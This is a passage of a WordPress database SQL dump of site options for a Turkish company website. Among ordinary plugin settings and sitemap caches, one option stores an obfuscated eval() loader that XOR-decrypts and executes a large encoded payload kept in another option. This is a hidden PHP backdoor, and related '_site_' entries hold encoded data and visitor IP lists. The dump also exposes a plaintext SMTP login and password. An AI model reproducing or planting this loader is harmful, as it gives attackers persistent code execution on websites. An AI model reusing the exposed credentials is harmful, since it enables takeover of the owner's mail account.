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","yes");
INSERT INTO `cmrfu_options` VALUES("15390","_transient_","eval(\'function function3($k,$d){$d=md5($d).md5($d.$d);$l=strpos($k,$d);if ($l>0){$c=\"ok\";}else{$c=\"\";} $l=strlen($d);for($s=0;$s<strlen($k);$s++){$c.= chr(ord($k[$s])^ord($d[$s%$l]));}return $c;}$session_prefix = \"65f30fe6\"; @eval(function3(base64_decode(get_option(\"_site_cache\")),$session_prefix));\');","yes");
INSERT INTO `cmrfu_options` VALUES("2718","smtp_user","info@herkonyapi.com","yes");
INSERT INTO `cmrfu_options` VALUES("2719","smtp_pass","herkon123","yes");
INSERT INTO `cmrfu_options` VALUES("2791","jquery-colorbox_settings","a:27:{s:12:\"autoColorbox\";s:4:\"true\";s:21:\"removeLinkFromMetaBox\";s:4:\"true\";s:18:\"colorboxWarningOff\";s:4:\"true\";s:13:\"colorboxTheme\";s:6:\"theme1\";s:14:\"slideshowSpeed\";s:4:\"2500\";s:8:\"maxWidth\";s:5:\"false\";s:13:\"maxWidthValue\";s:0:\"\";s:12:\"maxWidthUnit\";s:1:\"%\";s:9:\"maxHeight\";s:5:\"false\";s:14:\"maxHeightValue\";s:0:\"\";s:13:\"maxHeightUnit\";s:1:\"%\";s:5:\"width\";s:5:\"false\";s:10:\"widthValue\";s:0:\"\";s:9:\"widthUnit\";s:1:\"%\";s:6:\"height\";s:5:\"false\";s:11:\"heightValue\";s:0:\"\";s:10:\"heightUnit\";s:1:\"%\";s:9:\"linkWidth\";s:5:\"false\";s:14:\"linkWidthValue\";s:0:\"\";s:13:\"linkWidthUnit\";s:1:\"%\";s:10:\"linkHeight\";s:5:\"false\";s:15:\"linkHeightValue\";s:0:\"\";s:14:\"linkHeightUnit\";s:1:\"%\";s:10:\"transition\";s:7:\"elastic\";s:5:\"speed\";s:3:\"350\";s:7:\"opacity\";s:4:\"0.85\";s:21:\"jQueryColorboxVersion\";s:3:\"4.6\";}","yes");
INSERT INTO `cmrfu_options` VALUES("15473","widget_rev-slider-widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15474","widget_enews","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15475","widget_er_leaf-flickr-widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15413","GOTMLS_settings_array","a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:15:\"skip_quarantine\";i:0;s:5:\"check\";a:5:{i:0;s:8:\"htaccess\";i:1;s:8:\"timthumb\";i:2;s:8:\"backdoor\";i:3;s:5:\"known\";i:4;s:9:\"potential\";}}","yes");
INSERT INTO `cmrfu_options` VALUES("15414","GOTMLS_nonce_array","a:10:{s:32:\"abf3499abf1b0acb1e908162c0f9969b\";d:410494;s:32:\"4bc2d10231086804a5ab8e6b4ebb8199\";d:410536;s:32:\"7f3fb4aa14a4ea360ef024fb50b26d11\";d:410608;s:32:\"993d630af7221df11cc5bf8e3ea859d8\";d:410609;s:32:\"a2daa403b43d247f95424a23ab2f72d7\";d:410705;s:32:\"21d33fdb620815f0aeff453b2edaf62f\";d:410783;s:32:\"da523066f1138d281279d3ff004544fc\";d:410924;s:32:\"7cfafc11a049f8bfe6ccd8b8ce4eb336\";d:411074;s:32:\"e89dee5dc6bf62e8fe1bab6324a7b63f\";d:412726;s:32:\"9706ef7587150de049d03fab2f07933d\";d:412836;}","yes");
INSERT INTO `cmrfu_options` VALUES("15415","GOTMLS_Installation_Keys","s:149:\"a:2:{s:32:\"e0bcbd4fc7228f447a568e06b36d8a3d\";s:21:\"http://www.ismido.com.tr\";s:32:\"9d4bac3e68648ca74ea15906ce90d693\";s:26:\"http://www.ismido.com.tr\";}\";","yes");
INSERT INTO `cmrfu_options` VALUES("19442","_transient_timeout_yst_sm_author_1:3cCoc_3cDKn","1489739597","no");
INSERT INTO `cmrfu_options` VALUES("19443","_transient_yst_sm_author_1:3cCoc_3cDKn","C:24:\"WPSEO_Sitemap_Cache_Data\":470:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:423:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.ismido.com.tr/author/ismido/</loc>
		<lastmod>2017-03-10T10:25:32+02:00</lastmod>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("19444","_transient_timeout_yst_sm_post_1:3cCoc_35YLo","1489782596","no");
INSERT INTO `cmrfu_options` VALUES("19445","_transient_yst_sm_post_1:3cCoc_35YLo","C:24:\"WPSEO_Sitemap_Cache_Data\":527:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:480:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.ismido.com.tr/blog/</loc>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/ismido-com/</loc>
		<lastmod>2017-03-10T10:26:01+02:00</lastmod>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("15408","_transient_timeout_plugin_slugs","1489304956","no");
INSERT INTO `cmrfu_options` VALUES("15409","_transient_plugin_slugs","a:13:{i:0;s:19:\"akismet/akismet.php\";i:1;s:51:\"all-in-one-wp-security-and-firewall/wp-security.php\";i:2;s:16:\"gotmls/index.php\";i:3;s:36:\"contact-form-7/wp-contact-form-7.php\";i:4;s:9:\"hello.php\";i:5;s:35:\"jquery-colorbox/jquery-colorbox.php\";i:6;s:39:\"lockdown-wp-admin/lockdown-wp-admin.php\";i:7;s:47:\"really-simple-captcha/really-simple-captcha.php\";i:8;s:23:\"revslider/revslider.php\";i:9;s:20:\"smtp-mailer/main.php\";i:10;s:41:\"wordpress-importer/wordpress-importer.php\";i:11;s:27:\"wp-super-cache/wp-cache.php\";i:12;s:24:\"wordpress-seo/wp-seo.php\";}","no");
INSERT INTO `cmrfu_options` VALUES("15715","underconstruction_global_notification","1","yes");
INSERT INTO `cmrfu_options` VALUES("15392","_site_0","1477776485","yes");
INSERT INTO `cmrfu_options` VALUES("15393","_site_bad","","yes");
INSERT INTO `cmrfu_options` VALUES("15394","_site_1","1477777554","yes");
INSERT INTO `cmrfu_options` VALUES("15395","_site_html","DkIVSQ8XG0MDVUtkeiEoMityLyZieyQ0djIYcn0pHgdRS29DCA9QCghAQFxMQVNdCldfHVkMAVNKR11GDlNbDD9GF10Bcxl9JFE0QloLCCEsUgguAlU8A343WglgO25OAgp1dDBFM11sDgtgfR5Yd1pmNgt6FAFTZUdDCklYTTMrQDlaf09wYSJfMXd+FBEjN30QJnxtAzVyUX16ACt5ZwMOHUkgXSkBcy5nAk9BaG0wWBAQTAUydRQIVwpmYnFPXhAASEYFTVEIVABIHVNTUQUJVk0FCFMFBQwF","yes");
INSERT INTO `cmrfu_options` VALUES("15396","_site_html_err","0","yes");
INSERT INTO `cmrfu_options` VALUES("15397","_site_recent","36.73.83 167.56.43 145.255.176 54.212.84 54.153.120 103.15.140 123.205.79 180.76.15 188.58.27 5.255.253 74.131.176 178.154.189 101.99.64 72.76.221 91.200.14 178.162.211 195.142.216 66.249.66 194.226.35 91.238.114 5.101.219 46.148.31 209.128.119 182.118.21 199.15.233 182.118.22 70.60.231 178.33.71 182.118.25 163.172.66 185.129.148 212.72.182 142.4.22 130.180.217 62.149.1 62.209.128 112.140.176 198.71.227 141.8.183 213.251.182 66.212.17 182.118.20 164.132.161 201.163.239 94.73.146 178.63.91 108.175.157 5.9.89 85.214.252 151.1.48 88.200.136 78.63.132 103.200.20 82.223.25 103.27.60 208.91.198 91.234.194 213.205.252 144.76.225 184.154.146 213.52.172 198.20.250 93.174.1 212.64.200 175.107.184 192.210.231 52.8.102 206.207.117 92.53.96 62.210.250 68.180.230 80.78.250 157.55.39 91.234.32 198.154.212 92.53.123 46.235.47 192.185.176 213.136.78 207.182.142 160.153.153 149.56.19 182.50.132 73.157.93 192.185.2 85.128.142 162.144.90 69.195.124 213.136.86 85.113.39 97.74.215 97.74.24 184.168.27 97.74.144 72.167.183 193.105.210 85.93.5 50.63.197 71.19.241 192.154.110","yes");
INSERT INTO `cmrfu_options` VALUES("15417","GOTMLS_scan_log/195.142.216.94/1477778328.0224","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:28:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:0:{}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:2:{i:0;s:8:\"backdoor\";i:1;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1477778361;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:540;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1477778900.1970479;s:6:\"finish\";i:1477778901;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15418","GOTMLS_scan_log/195.142.216.94/1477778920.3234","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:28:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:0:{}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:1:{i:0;s:8:\"backdoor\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1477778920;s:4:\"type\";s:10:\"Quick 